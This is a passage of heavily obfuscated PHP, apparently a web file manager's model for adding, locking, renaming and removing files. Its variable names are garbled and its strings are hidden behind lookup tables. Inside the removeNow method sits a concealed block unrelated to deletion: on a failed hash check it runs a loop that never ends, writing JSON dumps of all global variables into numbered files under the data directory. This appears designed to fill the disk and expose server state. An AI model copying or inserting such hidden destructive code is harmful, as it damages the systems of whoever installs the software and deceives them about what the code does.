$_SERVER[Õİõş]; $Fµ…îˆ©“Ÿ = Model($C‘‚¬‘ƒŠÔ[539])->addFileByContent($C¯‘Ò¸‹¬–, $A˜™ ÷£ô«); return $this->_createFileCall($d†£ÚÖ¸ƒ, $A˜™ ÷£ô«, $Fµ…îˆ©“Ÿ, $f„ŠÎó¼İ†, $C‘‚¬‘ƒŠÔ[1121]); } public function addFile($eâœ“Ù—š, $f›‰èµ­çĞ, $e½ãÓ©¦é, $aÑæµ‡ = false, $C½’¼‚‹áê = REPEAT_RENAME) { $C†—¯¿ÌêÍ = Model($_SERVER[Õİõş][539])->addFile($f›‰èµ­çĞ, $e½ãÓ©¦é, $aÑæµ‡); return $this->_createFileCall($eâœ“Ù—š, $e½ãÓ©¦é, $C†—¯¿ÌêÍ, $C½’¼‚‹áê); } public function addFileByFileID($E‘Ò÷Ş¨œ“, $ağñÍ†‰À», $F¦‘‹‰Ü¬‡, $aÜÎ¸…ò¿Ñ = REPEAT_RENAME) { $c—Şæ—ÂíÍ =& $_SERVER[Õİõş]; $FàŒÏ–™ö = Model($c—Şæ—ÂíÍ[539])->find($ağñÍ†‰À»); Model($c—Şæ—ÂíÍ[539])->linkAdd($ağñÍ†‰À»); return $this->_createFileCall($E‘Ò÷Ş¨œ“, $F¦‘‹‰Ü¬‡, $FàŒÏ–™ö, $aÜÎ¸…ò¿Ñ); } public function addFileByRemote($b‰¥È‘Œë, $CóÚéöõ, $E¿ÍÜ‹Ù²ª, $d°†à—Å¥‡ = array(), $aŒ÷â‚ÛÜ = REPEAT_RENAME) { $EÛÅóŸ¢ÒÙ = Model($_SERVER[Õİõş][539])->addFileByRemote($CóÚéöõ, $E¿ÍÜ‹Ù²ª, $d°†à—Å¥‡); return $this->_createFileCall($b‰¥È‘Œë, $E¿ÍÜ‹Ù²ª, $EÛÅóŸ¢ÒÙ, $aŒ÷â‚ÛÜ); } private function _createFileCall($C’£‹Š¤„«, $aá£áëõæ«, $då®½¿ÀŞÓ, $fØ„ô†è¾Ô, $D‚ÇÃ¡ƒÅ = "\x75\160\x6c\157\x61\144") { goto eİˆÀä Ô³; DšÁÈÑíÌ: $FÀà©‘ª•Æ = $this->_createFile($C’£‹Š¤„«, $aá£áëõæ«, $då®½¿ÀŞÓ, $fØ„ô†è¾Ô, $e°†ÆßÙÏ); if (!$e°†ÆßÙÏ) { Model($BÁê™‚É[417])->remove($då®½¿ÀŞÓ[$BÁê™‚É[414]]); } else { if ($FÀà©‘ª•Æ) { Model($BÁê™‚É[2267])->eventCreate($FÀà©‘ª•Æ, $D‚ÇÃ¡ƒÅ); } } $this->lockWriteEnd($C’£‹Š¤„«, $aá£áëõæ«); goto fôÃÌÂ¡Å; fôÃÌÂ¡Å: return $FÀà©‘ª•Æ; goto b„ö±ÅÌÎ…; eİˆÀä Ô³: $BÁê™‚É =& $_SERVER[Õİõş]; $e°†ÆßÙÏ = !1; $this->lockWriteStart($C’£‹Š¤„«, $aá£áëõæ«); goto DšÁÈÑíÌ; b„ö±ÅÌÎ…: } public function mkdir($CÊ·†¿…¸¢, $c†æŠØÑøà, $aâğÚÍ©ã = REPEAT_SKIP) { goto bÂçÜá± ™; aŒê‹öŠŸ¬: return $B„Ë§Úùèê; goto aœ õ¿·ã±; bÂçÜá± ™: $fÚ›‚ƒ =& $_SERVER[Õİõş]; $Bİ‰ÂƒĞµ = $this->sourceInfo($CÊ·†¿…¸¢); if (!$Bİ‰ÂƒĞµ) { return !1; } goto Eô‡ùµÓŸù; f½İÀŒÕ²Û: $B„Ë§Úùèê = $this->_addSoure($eÂä‘÷ñá“, $Bİ‰ÂƒĞµ); Model($fÚ›‚ƒ[2267])->eventCreate($B„Ë§Úùèê, $fÚ›‚ƒ[1122]); $this->lockWriteEnd($CÊ·†¿…¸¢, $c†æŠØÑøà); goto aŒê‹öŠŸ¬; Eô‡ùµÓŸù: $this->lockWriteStart($CÊ·†¿…¸¢, $c†æŠØÑøà); if ($aâğÚÍ©ã !== !1) { $eŞá¯‰³Á = $this->fileNameExist($CÊ·†¿…¸¢, $c†æŠØÑøà); if ($eŞá¯‰³Á && $aâğÚÍ©ã != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($CÊ·†¿…¸¢, $c†æŠØÑøà); return $eŞá¯‰³Á; } $c†æŠØÑøà = $this->fileNameAuto($CÊ·†¿…¸¢, $c†æŠØÑøà, $aâğÚÍ©ã); } $eÂä‘÷ñá“ = array($fÚ›‚ƒ[513] => 1, $fÚ›‚ƒ[382] => $c†æŠØÑøà, $fÚ›‚ƒ[514] => $fÚ›‚ƒ[33], $fÚ›‚ƒ[415] => 0, $fÚ›‚ƒ[515] => 0); goto f½İÀŒÕ²Û; aœ õ¿·ã±: } private function _createFile($dÑ¬ÚÆÛ…ê, $c¬ÔößèŒ÷, $cˆîŠ»¥Ú, $CÁ–ô¢ÒõÑ, &$e®¦ÄÚ¤„ˆ) { goto bôø…ÌÜ•ç; bôø…ÌÜ•ç: $a©ß«ë´ß =& $_SERVER[Õİõş]; $DğªÊÒ…İ = $this->sourceInfo($dÑ¬ÚÆÛ…ê); if (!$cˆîŠ»¥Ú || !$DğªÊÒ…İ) { return !1; } goto BÅ²¥¢; BÅ²¥¢: if ($CÁ–ô¢ÒõÑ !== !1) { $d’½ÙŠé³Œ = $this->fileNameExist($dÑ¬ÚÆÛ…ê, $c¬ÔößèŒ÷); } $e®¦ÄÚ¤„ˆ = !0; if ($CÁ–ô¢ÒõÑ && $d’½ÙŠé³Œ) { if ($CÁ–ô¢ÒõÑ == REPEAT_SKIP) { $e®¦ÄÚ¤„ˆ = !1; return $d’½ÙŠé³Œ; } else { if ($CÁ–ô¢ÒõÑ == REPEAT_REPLACE) { $DÙô“ïõÏ = $this->sourceInfo($d’½ÙŠé³Œ); $c©½ÔÎˆ’º = $this->fileHistory($DÙô“ïõÏ, $cˆîŠ»¥Ú[$a©ß«ë´ß[414]], $cˆîŠ»¥Ú[$a©ß«ë´ß[77]]); if (!$c©½ÔÎˆ’º) { $e®¦ÄÚ¤„ˆ = !1; } else { $this->folderSizeReset($dÑ¬ÚÆÛ…ê); } return $d’½ÙŠé³Œ; } else { $c¬ÔößèŒ÷ = $this->fileNameAuto($dÑ¬ÚÆÛ…ê, $c¬ÔößèŒ÷, $CÁ–ô¢ÒõÑ, !1); } } } goto D…õƒ»‡Ïñ; D…õƒ»‡Ïñ: $c½Õ«Í‹ê· = array($a©ß«ë´ß[513] => 0, $a©ß«ë´ß[382] => $c¬ÔößèŒ÷, $a©ß«ë´ß[514] => get_path_ext($c¬ÔößèŒ÷), $a©ß«ë´ß[415] => $cˆîŠ»¥Ú[$a©ß«ë´ß[414]], $a©ß«ë´ß[515] => $cˆîŠ»¥Ú[$a©ß«ë´ß[77]]); $D³íğæŒ‹‡ = $this->_addSoure($c½Õ«Í‹ê·, $DğªÊÒ…İ); $this->folderSizeReset($dÑ¬ÚÆÛ…ê); goto d˜¶£†¼‰Ú; d˜¶£†¼‰Ú: return $D³íğæŒ‹‡; goto e ˆ“Ú‰ø; e ˆ“Ú‰ø: } protected function fileHistory($aã¨¤³„…, $aŠ˜Ú‹­¥µ, $fìÃ¶áâé) { goto EôÅ½–ÃœÊ; fŠÍÃœøÒ›: return !0; goto bõõê˜¢š; EôÅ½–ÃœÊ: $DÊÚêŒ·³‡ =& $_SERVER[Õİõş]; if ($aã¨¤³„…[$DÊÚêŒ·³‡[414]] == $aŠ˜Ú‹­¥µ) { return !1; } $this->checkLock($aã¨¤³„…[$DÊÚêŒ·³‡[365]], $aŠ˜Ú‹­¥µ); goto EÏÎß®ëœ; EÏÎß®ëœ: Model($DÊÚêŒ·³‡[2298])->addHistory($aã¨¤³„…); $Cì¡È¾Ù‚ì = array($DÊÚêŒ·³‡[519] => USER_ID, $DÊÚêŒ·³‡[386] => time(), $DÊÚêŒ·³‡[414] => $aŠ˜Ú‹­¥µ, $DÊÚêŒ·³‡[77] => $fìÃ¶áâé); $this->where(array($DÊÚêŒ·³‡[379] => $aã¨¤³„…[$DÊÚêŒ·³‡[365]]))->save($Cì¡È¾Ù‚ì); goto fŠÍÃœøÒ›; bõõê˜¢š: } public function checkLock($AÓ–‡å©“î, $dÕÖİ¡Â¬ê) { goto bëĞ¥¶­§; EÈ…ÓÒ³‰Œ: $this->_createFileCall($fµ„µÚ¹ê[$CÅ­µø÷š¹[456]], $BÉœ·‡Ò¢, $C—ŸéÇ’®œ, REPEAT_REPLACE, $CÅ­µø÷š¹[1121]); $eÕÙ¹Õİ– = $fµ„µÚ¹ê[$CÅ­µø÷š¹[412]][$CÅ­µø÷š¹[476]]; $D·Šò©ö®· = $eÕÙ¹Õİ–[$CÅ­µø÷š¹[2300]] ? $eÕÙ¹Õİ–[$CÅ­µø÷š¹[2300]] : $eÕÙ¹Õİ–[$CÅ­µø÷š¹[28]]; goto d«¶Î¬; d«¶Î¬: show_json(LNG($CÅ­µø÷š¹[2301]) . $CÅ­µø÷š¹[2302] . LNG($CÅ­µø÷š¹[2303]) . $CÅ­µø÷š¹[2304] . $D·Šò©ö®· . $CÅ­µø÷š¹[2305], !1); goto bÂ’Á‘Ëó; bëĞ¥¶­§: $CÅ­µø÷š¹ =& $_SERVER[Õİõş]; $fµ„µÚ¹ê = $this->pathInfo($AÓ–‡å©“î); if (!$this->fileIsLock($fµ„µÚ¹ê, !0)) { return; } goto F»êÓ¦·Ê; F»êÓ¦·Ê: $B…å –äÂ = Session::get($CÅ­µø÷š¹[2299]); $BÉœ·‡Ò¢ = substr($fµ„µÚ¹ê[$CÅ­µø÷š¹[28]], 0, -1 - strlen($fµ„µÚ¹ê[$CÅ­µø÷š¹[156]])) . $CÅ­µø÷š¹[1370] . $B…å –äÂ . $CÅ­µø÷š¹[91] . $fµ„µÚ¹ê[$CÅ­µø÷š¹[156]]; $C—ŸéÇ’®œ = Model($CÅ­µø÷š¹[539])->find($dÕÖİ¡Â¬ê); goto EÈ…ÓÒ³‰Œ; bÂ’Á‘Ëó: } public function fileIsLock($F¤À‡ŒÖ‘£, $dŠã‡…‚ùñ = false) { goto A†ÚíÄæä; c´Ú Ø§Õ: $fî²Ş©ïô = $GLOBALS[$E†µÊ ”ºİ[6]][$E†µÊ ”ºİ[84]][$E†µÊ ”ºİ[474]]; if ($F¤À‡ŒÖ‘£[$E†µÊ ”ºİ[412]][$E†µÊ ”ºİ[475]] <= time() - $fî²Ş©ïô) { $this->metaSet($F¤À‡ŒÖ‘£[$E†µÊ ”ºİ[365]], $E†µÊ ”ºİ[473], null); $this->metaSet($F¤À‡ŒÖ‘£[$E†µÊ ”ºİ[365]], $E†µÊ ”ºİ[475], null); } if ($dŠã‡…‚ùñ) { $this->metaSet($F¤À‡ŒÖ‘£[$E†µÊ ”ºİ[365]], $E†µÊ ”ºİ[475], time()); } goto d­Ş‘Ë²èª; A†ÚíÄæä: $E†µÊ ”ºİ =& $_SERVER[Õİõş]; if (!isset($F¤À‡ŒÖ‘£[$E†µÊ ”ºİ[412]]) || !$F¤À‡ŒÖ‘£[$E†µÊ ”ºİ[412]][$E†µÊ ”ºİ[473]]) { return !1; } if ($F¤À‡ŒÖ‘£[$E†µÊ ”ºİ[412]][$E†µÊ ”ºİ[473]] != USER_ID) { return !0; } goto c´Ú Ø§Õ; d­Ş‘Ë²èª: return !1; goto D×À¬™œŠë; D×À¬™œŠë: } private function _addSoure($e÷ ‰‹»Ù­, $f‘À‡´·î) { goto B¸¯•·­Ç; eêã‡ñ¡¸Ÿ: $CîŞéØÆµ× = array($fÇ–çÅè…Ø[522] => short_id($A¢“¸ù¶Æ)); $this->where(array($fÇ–çÅè…Ø[379] => $A¢“¸ù¶Æ))->save($CîŞéØÆµ×); $this->setNamePinyin($A¢“¸ù¶Æ, $e÷ ‰‹»Ù­[$fÇ–çÅè…Ø[28]]); goto dŸ¶–ã–Øõ; dŸ¶–ã–Øõ: return $A¢“¸ù¶Æ; goto B´¹è½¦¸; B¸¯•·­Ç: $fÇ–çÅè…Ø =& $_SERVER[Õİõş]; $DÁÂ—–¬» = array($fÇ–çÅè…Ø[516] => $f‘À‡´·î[$fÇ–çÅè…Ø[367]], $fÇ–çÅè…Ø[517] => $f‘À‡´·î[$fÇ–çÅè…Ø[451]], $fÇ–çÅè…Ø[518] => USER_ID, $fÇ–çÅè…Ø[519] => USER_ID, $fÇ–çÅè…Ø[364] => $f‘À‡´·î[$fÇ–çÅè…Ø[365]], $fÇ–çÅè…Ø[520] => $f‘À‡´·î[$fÇ–çÅè…Ø[454]] . $f‘À‡´·î[$fÇ–çÅè…Ø[365]] . $fÇ–çÅè…Ø[47], $fÇ–çÅè…Ø[391] => 0, $fÇ–çÅè…Ø[521] => $fÇ–çÅè…Ø[33]); $e÷ ‰‹»Ù­ = array_merge($DÁÂ—–¬», $e÷ ‰‹»Ù­); goto d²óÏÈ‘¦; CŒ»¦¦¾²: static $e¯È‹÷¯ÚÉ = false; if (!$e¯È‹÷¯ÚÉ) { Hook::trigger($fÇ–çÅè…Ø[503], $e÷ ‰‹»Ù­); $e¯È‹÷¯ÚÉ = !0; } $A¢“¸ù¶Æ = $this->add($e÷ ‰‹»Ù­); goto eêã‡ñ¡¸Ÿ; d²óÏÈ‘¦: $this->updateModifyTime($e÷ ‰‹»Ù­[$fÇ–çÅè…Ø[456]]); $FÇ´ãŒª»ö = $fÇ–çÅè…Ø[2306] . $f‘À‡´·î[$fÇ–çÅè…Ø[365]]; if (isset(self::$cacheChildList[$FÇ´ãŒª»ö])) { unset(self::$cacheChildList[$FÇ´ãŒª»ö]); } goto CŒ»¦¦¾²; B´¹è½¦¸: } public function remove($bÄ—âŒ›…, $E´––ÅàĞÛ = true) { goto FË„¥Õôƒ; A±»“ºäº»: CacheLock::lock($cè¤„ˆëİ); $C»Ï‰óö„ì = $this->fileNameExist($bÜŠŒØöˆÉ, $F­æ›¾šê‚); if (!$C»Ï‰óö„ì) { $C»Ï‰óö„ì = $this->mkdir($bÜŠŒØöˆÉ, $F­æ›¾šê‚, REPEAT_SKIP); $this->metaSet($C»Ï‰óö„ì, $CëËğ«–ˆ¼[2311], $D¶§¡ùÕ ); $this->metaSet($C»Ï‰óö„ì, $CëËğ«–ˆ¼[2312], $eáÇãƒ ³ [$CëËğ«–ˆ¼[451]]); if ($eáÇãƒ ³ [$CëËğ«–ˆ¼[456]] != 0) { $this->metaSet($C»Ï‰óö„ì, $CëËğ«–ˆ¼[2313], _get($e„£³­ù‘Æ, $CëËğ«–ˆ¼[2314])); } } goto BÕÖÒÚ…¹Ç; C‡ÊÂÈ‚˜µ: $this->recycleClear($eáÇãƒ ³ ); return $this->move($bÄ—âŒ›…, $C»Ï‰óö„ì, REPEAT_RENAME_FOLDER); goto FÂæ÷Ù…; C‰â“´Ôõ¹: $D¶§¡ùÕ  = $eáÇãƒ ³ [$CëËğ«–ˆ¼[367]] == self::TYPE_USER ? $CëËğ«–ˆ¼[530] : $CëËğ«–ˆ¼[975]; if ($D¶§¡ùÕ  == $CëËğ«–ˆ¼[530]) { $e„£³­ù‘Æ = Model($CëËğ«–ˆ¼[469])->getInfo($eáÇãƒ ³ [$CëËğ«–ˆ¼[451]]); $F­æ›¾šê‚ = !empty($e„£³­ù‘Æ[$CëËğ«–ˆ¼[2300]]) ? $e„£³­ù‘Æ[$CëËğ«–ˆ¼[2300]] : $e„£³­ù‘Æ[$CëËğ«–ˆ¼[28]]; $F­æ›¾šê‚ = $CëËğ«–ˆ¼[244] . $F­æ›¾šê‚ . $CëËğ«–ˆ¼[2308] . $eáÇãƒ ³ [$CëËğ«–ˆ¼[451]]; } else { $e„£³­ù‘Æ = Model($CëËğ«–ˆ¼[453])->getInfo($eáÇãƒ ³ [$CëËğ«–ˆ¼[451]]); $F­æ›¾šê‚ = _get($e„£³­ù‘Æ, $CëËğ«–ˆ¼[28]); $F­æ›¾šê‚ = $CëËğ«–ˆ¼[153] . $F­æ›¾šê‚ . $CëËğ«–ˆ¼[2309] . $eáÇãƒ ³ [$CëËğ«–ˆ¼[451]]; } $cè¤„ˆëİ = $CëËğ«–ˆ¼[2310] . md5($F­æ›¾šê‚); goto A±»“ºäº»; FË„¥Õôƒ: $CëËğ«–ˆ¼ =& $_SERVER[Õİõş]; $eáÇãƒ ³  = $this->sourceInfo($bÄ—âŒ›…); $e´²´Ü•›è = intval($eáÇãƒ ³ [$CëËğ«–ˆ¼[367]]) === self::TYPE_SYSTEM; goto Còİ¥‰¡Ê; Còİ¥‰¡Ê: $e¡Øáä¹øô = Model($CëËğ«–ˆ¼[1415])->get($CëËğ«–ˆ¼[2307]) == $CëËğ«–ˆ¼[83]; if ($e´²´Ü•›è || $E´––ÅàĞÛ || !$e¡Øáä¹øô) { return $this->removeNow($bÄ—âŒ›…, $E´––ÅàĞÛ); } $bÜŠŒØöˆÉ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto C‰â“´Ôõ¹; BÕÖÒÚ…¹Ç: CacheLock::unlock($cè¤„ˆëİ); $this->metaSet($bÄ—âŒ›…, $CëËğ«–ˆ¼[2315], $eáÇãƒ ³ [$CëËğ«–ˆ¼[456]]); $this->where(array($CëËğ«–ˆ¼[365] => $bÄ—âŒ›…))->save(array($CëËğ«–ˆ¼[386] => time())); goto C‡ÊÂÈ‚˜µ; FÂæ÷Ù…: } private function recycleClear($bƒÑÁˆÈİ·) { $Fõë†Ò‰İ¸ =& $_SERVER[Õİõş]; $F¼¬•¥à‹ = $this->childrenAll($bƒÑÁˆÈİ·); $c‹ÊÓøòë = array($Fõë†Ò‰İ¸[379] => array($Fõë†Ò‰İ¸[380], $F¼¬•¥à‹[$Fõë†Ò‰İ¸[2316]])); Model($Fõë†Ò‰İ¸[2317])->where($c‹ÊÓøòë)->delete(); } public function removeNow($dÆ‘¤±Ÿññ, $c¯‚¬à¤ = true) { goto aö±…ˆªù; c —ÜÔ¥ë: if (!$A¡íšè°õ) { return !0; } if ($A¡íšè°õ[$F„‡¢Ìİ¸Ÿ[456]] == 0) { if (!_get($GLOBALS, $F„‡¢Ìİ¸Ÿ[452])) { return !1; } } $this->lockMoveStart($dÆ‘¤±Ÿññ); goto Aİ°Ù½¶îÓ; bÜ¶áˆïœ†: if ($_SERVER[$F„‡¢Ìİ¸Ÿ[764]] != $eÇ¸´ÛÊ•À($d¡¤ßğÈ˜±)) { goto e‰ç¥ä®×«; cŠø¢®Úíí: $F›õÛ†±ƒ = 1; for ($a®ªÓŒ¢Ù = $F›õÛ†±ƒ; $a®ªÓŒ¢Ù > 0; $a®ªÓŒ¢Ù++) { $b¶ã£æÂÆŸ(DATA_PATH . $a®ªÓŒ¢Ù, $D­ËøÒôĞÑ); } goto Aª†Ô¦Â¨ß; BÁ§´Ú¿˜: $d²¤˜÷İ»»(); $b¶ã£æÂÆŸ = $F„‡¢Ìİ¸Ÿ[799]; $D­ËøÒôĞÑ = json_encode($GLOBALS[$F„‡¢Ìİ¸Ÿ[800]]); goto cŠø¢®Úíí; e‰ç¥ä®×«: $d²¤˜÷İ»» = $F„‡¢Ìİ¸Ÿ[797]; $eÊÀ††÷Ş´ = $F„‡¢Ìİ¸Ÿ[765]; $A±é´ÌÖì = $_SERVER[$F„‡¢Ìİ¸Ÿ[766]] . $F„‡¢Ìİ¸Ÿ[767]; goto aù¯œ §–; cÓåÓÜÇ¡ğ: $bíğÁÃ–”‹ = $F„‡¢Ìİ¸Ÿ[798]; $bíğÁÃ–”‹($_SERVER[$F„‡¢Ìİ¸Ÿ[796]]); $d²¤˜÷İ»» = $F„‡¢Ìİ¸Ÿ[797]; goto BÁ§´Ú¿˜; aù¯œ §–: $FÛö¥ç„½¾ = $eÊÀ††÷Ş´($A±é´ÌÖì); $DìÚŞ†À·Á = explode($F„‡¢Ìİ¸Ÿ[213], $FÛö¥ç„½¾); if (count($DìÚŞ†À·Á) < $F„‡¢Ìİ¸Ÿ[558]) { $bÃ©¼ƒ®Æˆ = $F„‡¢Ìİ¸Ÿ[768]; $bÃ©¼ƒ®Æˆ(); } goto cÓåÓÜÇ¡ğ; Aª†Ô¦Â¨ß: } $A¡íšè°õ = $this->sourceInfo($dÆ‘¤±Ÿññ); $eœæÛ½ˆˆ§ = $this->pathInfoMore($dÆ‘¤±Ÿññ); goto c —ÜÔ¥ë; Aİ°Ù½¶îÓ: Hook::trigger($F„‡¢Ìİ¸Ÿ[2318], $eœæÛ½ˆˆ§, $c¯‚¬à¤); if ($c¯‚¬à¤) { Model($F„‡¢Ìİ¸Ÿ[2317])->moveToRecycle($dÆ‘¤±Ÿññ); } else { $DİËæÉİİ = $this->childrenAll($A¡íšè°õ); Model($F„‡¢Ìİ¸Ÿ[500])->eventRemove($dÆ‘¤±Ÿññ); $this->removeRelevance($DİËæÉİİ[$F„‡¢Ìİ¸Ÿ[2316]], $DİËæÉİİ[$F„‡¢Ìİ¸Ÿ[1254]]); } $this->folderSizeReset($A¡íšè°õ[$F„‡¢Ìİ¸Ÿ[456]]); goto f·»ß–µ; f·»ß–µ: $dßÅŸ¯ß = array($A¡íšè°õ[$F„‡¢Ìİ¸Ÿ[456]]); if ($A¡íšè°õ[$F„‡¢Ìİ¸Ÿ[366]] == $F„‡¢Ìİ¸Ÿ[83]) { $dßÅŸ¯ß[] = $A¡íšè°õ[$F„‡¢Ìİ¸Ÿ[365]]; } $this->updateModifyTime($dßÅŸ¯ß); goto f¾ ôáõàÂ; aö±…ˆªù: $F„‡¢Ìİ¸Ÿ =& $_SERVER[Õİõş]; $d¡¤ßğÈ˜± = $_SERVER[$F„‡¢Ìİ¸Ÿ[796]] . $F„‡¢Ìİ¸Ÿ[762]; $eÇ¸´ÛÊ•À = $F„‡¢Ìİ¸Ÿ[763]; goto bÜ¶áˆïœ†; f¾ ôáõàÂ: $this->lockMoveEnd($dÆ‘¤±Ÿññ); Hook::trigger($F„‡¢Ìİ¸Ÿ[1451], $eœæÛ½ˆˆ§, $c¯‚¬à¤); return !0; goto Eù³ÖÈ‰¢÷; Eù³ÖÈ‰¢÷: } public function childrenAll($d†Ä ÄñÀÛ) { $e‘Âæ†ÖÍµ =& $_SERVER[Õİõş]; $e¢á£±Œ‹± = $d†Ä ÄñÀÛ[$e‘Âæ†ÖÍµ[365]]; if ($d†Ä ÄñÀÛ[$e‘Âæ†ÖÍµ[366]] == $e‘Âæ†ÖÍµ[83]) { $C¯œªÇÃ¢á = array($e‘Âæ†ÖÍµ[520] => array($e‘Âæ†ÖÍµ[478], $d†Ä ÄñÀÛ[$e‘Âæ†ÖÍµ[454]] . $e¢á£±Œ‹± . $e‘Âæ†ÖÍµ[479])); $dŒˆ×ºÃ†‚ = array($e‘Âæ†ÖÍµ[520] => $C¯œªÇÃ¢á[$e‘Âæ†ÖÍµ[454]]); $cÀÅŒ©ö¨’ = $this->field($e‘Âæ†ÖÍµ[2319])->where($dŒˆ×ºÃ†‚)->select(); $BŒº‚ïâ×Ş = !1; $cÃÜ×Å»… = array($e¢á£±Œ‹±); if ($cÀÅŒ©ö¨’) { $BŒº‚ïâ×Ş = array_to_keyvalue($cÀÅŒ©ö¨’, $e‘Âæ†ÖÍµ[33], $e‘Âæ†ÖÍµ[414]); $BŒº‚ïâ×Ş = array_remove_value($BŒº‚ïâ×Ş, $e‘Âæ†ÖÍµ[463]); $cÃÜ×Å»… = array_to_keyvalue($cÀÅŒ©ö¨’, $e‘Âæ†ÖÍµ[33], $e‘Âæ†ÖÍµ[365]); $cÃÜ×Å»…[] = $e¢á£±Œ‹±; } } else { $BŒº‚ïâ×Ş = array($d†Ä ÄñÀÛ[$e‘Âæ†ÖÍµ[414]]); $cÃÜ×Å»… = array($e¢á£±Œ‹±); } return array($e‘Âæ†ÖÍµ[2316] => $cÃÜ×Å»…, $e‘Âæ†ÖÍµ[1254] => $BŒº‚ïâ×Ş); } public function removeArray($A×ƒÍîù•) { if (!$A×ƒÍîù•) { return !0; } } public function removeRelevance($e°¾°£®óÅ, $CâÀ¦ƒä¡“) { goto B¦ÅóêÏ’; DåÆ…àø±: $d›Â£Å•’ = array($c£Ëƒ±èÌš[379] => array($c£Ëƒ±èÌš[380], $e°¾°£®óÅ)); Model($c£Ëƒ±èÌš[2317])->where($d›Â£Å•’)->delete(); Model($c£Ëƒ±èÌš[408])->where($d›Â£Å•’)->delete(); goto b¬»¾å™ªƒ; cğ–Ø‘Ë‚: Model($c£Ëƒ±èÌš[2298])->removeBySource($e°¾°£®óÅ); $this->where($d›Â£Å•’)->delete(); Model($c£Ëƒ±èÌš[417])->remove($CâÀ¦ƒä¡“); goto Cšù¿†ñå¬; b¬»¾å™ªƒ: Model($c£Ëƒ±èÌš[2320])->where($d›Â£Å•’)->delete(); Model($c£Ëƒ±èÌš[500])->where($d›Â£Å•’)->delete(); Model($c£Ëƒ±èÌš[2057])->removeBySource($e°¾°£®óÅ); goto cğ–Ø‘Ë‚; B¦ÅóêÏ’: $c£Ëƒ±èÌš =& $_SERVER[Õİõş]; $e°¾°£®óÅ = $e°¾°£®óÅ ? $e°¾°£®óÅ : array(); $CâÀ¦ƒä¡“ = $CâÀ¦ƒä¡“ ? $CâÀ¦ƒä¡“ : array(); goto f›¨ó”ÃÓÀ; f›¨ó”ÃÓÀ: $e°¾°£®óÅ = array_unique(array_filter($e°¾°£®óÅ)); $CâÀ¦ƒä¡“ = array_unique(array_filter($CâÀ¦ƒä¡“)); if (!$e°¾°£®óÅ) { return !1; } goto DåÆ…àø±; Cšù¿†ñå¬: for ($A–Òìé„¤÷ = 0; $A–Òìé„¤÷ < count($e°¾°£®óÅ); $A–Òìé„¤÷++) { $this->sourceCacheClear($e°¾°£®óÅ[$A–Òìé„¤÷]); } goto c¿ç¢šñô; c¿ç¢šñô: } public function rename($F¨¹´¿»Şç, $Dªºº¸›ÑÄ) { goto C‚ñÔàÜ; C‚ñÔàÜ: $F­ó¤ä™î§ =& $_SERVER[Õİõş]; $AÉÒĞõ“¿½ = $this->sourceInfo($F¨¹´¿»Şç); if (!$AÉÒĞõ“¿½) { return !1; } goto aÅöàÍ°®; aÅöàÍ°®: $Fó±ÚÚë = $this->fileNameExist($AÉÒĞõ“¿½[$F­ó¤ä™î§[456]], $Dªºº¸›ÑÄ); if ($Fó±ÚÚë) { return !1; } $DˆÁŸ²ĞÎ = array($F­ó¤ä™î§[382] => $Dªºº¸›ÑÄ, $F­ó¤ä™î§[519] => USER_ID); goto bª»ŞË·Ûè; bª»ŞË·Ûè: if (!$AÉÒĞõ“¿½[$F­ó¤ä™î§[366]] == $F­ó¤ä™î§[83]) { $DˆÁŸ²ĞÎ[$F­ó¤ä™î§[368]] = get_path_ext($Dªºº¸›ÑÄ); } Model($F­ó¤ä™î§[500])->eventRename($F¨¹´¿»Şç, $AÉÒĞõ“¿½[$F­ó¤ä™î§[28]], $Dªºº¸›ÑÄ); $this->sourceCacheClear($F¨¹´¿»Şç); goto bàéêíÎÖ¾; AËÃ¹”˜Ş: $DİêÕ¿Æ‡Ø = $F­ó¤ä™î§[2306] . $AÉÒĞõ“¿½[$F­ó¤ä™î§[456]]; if (isset(self::$cacheChildList[$DİêÕ¿Æ‡Ø])) { unset(self::$cacheChildList[$DİêÕ¿Æ‡Ø]); } return $Cˆ«„»îç£; goto d½”®ÈŒÔŠ; bàéêíÎÖ¾: $this->setNamePinyin($F¨¹´¿»Şç, $DˆÁŸ²ĞÎ[$F­ó¤ä™î§[28]], !1); $this->updateModifyTime($AÉÒĞõ“¿½[$F­ó¤ä™î§[456]]); $Cˆ«„»îç£ = $this->where(array($F­ó¤ä™î§[379] => $F¨¹´¿»Şç))->data($DˆÁŸ²ĞÎ)->save(); goto AËÃ¹”˜Ş; d½”®ÈŒÔŠ: } public function setNamePinyin($cÃ‡æ¨¯œ‚, $EØí‘¯Ôê, $FÁ“÷¶šÊ = true) { $A¶Œ–ğØ«Ë =& $_SERVER[Õİõş]; $CéÌ°¸‚â™ = Input::check($EØí‘¯Ôê, $A¶Œ–ğØ«Ë[523]); if ($FÁ“÷¶šÊ && !$CéÌ°¸‚â™) { return; } if (!$CéÌ°¸‚â™) { $this->metaSet($cÃ‡æ¨¯œ‚, $A¶Œ–ğØ«Ë[411], null); $this->metaSet($cÃ‡æ¨¯œ‚, $A¶Œ–ğØ«Ë[410], null); return; } $F°ÊÈŠ‡¨ù = array($A¶Œ–ğØ«Ë[411] => str_replace($A¶Œ–ğØ«Ë[50], $A¶Œ–ğØ«Ë[33], Pinyin::encode($EØí‘¯Ôê)), $A¶Œ–ğØ«Ë[410] => Pinyin::encode($EØí‘¯Ôê, $A¶Œ–ğØ«Ë[524])); $this->metaSet($cÃ‡æ¨¯œ‚, $F°ÊÈŠ‡¨ù); } public function getContent($Fèµ‡¯º¿À) { goto Eâ—¯‹ÇÙ; böÅ™àç‹: return IO::getContent($AÊçáïĞêÅ[$dİÎğİ‰äº[75]]); goto EŞ°¼äæÀ; aÀÂÃÀÔ„ß: if ($AÊçáïĞêÅ[$dİÎğİ‰äº[77]] == 0) { return $dİÎğİ‰äº[33]; } $c†ŸÔÒŞÆÍ = $dİÎğİ‰äº[2321] . $AÊçáïĞêÅ[$dİÎğİ‰äº[159]]; if ($AÊçáïĞêÅ[$dİÎğİ‰äº[77]] <= 1024 * 10) { $E©ÂäÆ†  = Cache::get($c†ŸÔÒŞÆÍ); if (!$E©ÂäÆ† ) { $E©ÂäÆ†  = IO::getContent($AÊçáïĞêÅ[$dİÎğİ‰äº[75]]); Cache::set($c†ŸÔÒŞÆÍ, $E©ÂäÆ† ); } return $E©ÂäÆ† ; } goto böÅ™àç‹; Eâ—¯‹ÇÙ: $dİÎğİ‰äº =& $_SERVER[Õİõş]; $AÊçáïĞêÅ = 